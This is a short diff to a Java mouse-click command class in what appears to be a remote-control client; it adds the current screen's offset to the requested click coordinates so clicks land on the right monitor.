@@ -5,6 +5,7 @@ package br.com.introcdc.connect.client.commands.control;
 
 import br.com.introcdc.connect.client.command.ClientCommand;
 import br.com.introcdc.connect.client.components.ClientControlComponents;
+import br.com.introcdc.connect.client.components.ClientImageComponents;
 
 public class ClientCommandMouseClick extends ClientCommand {
 
@@ -18,7 +19,7 @@ public class ClientCommandMouseClick extends ClientCommand {
             try {
                 String[] args = input.split(" ");
                 int x = Integer.parseInt(args[0]), y = Integer.parseInt(args[1]);
-                ClientControlComponents.ROBOT_INSTANCE.mouseMove(x, y);
+                ClientControlComponents.ROBOT_INSTANCE.mouseMove(ClientImageComponents.CURRENT_SCREEN_X + x, ClientImageComponents.CURRENT_SCREEN_Y + y);
             } catch (Exception ignored) {
                 msg("Digite dois números válidos");
                 return;
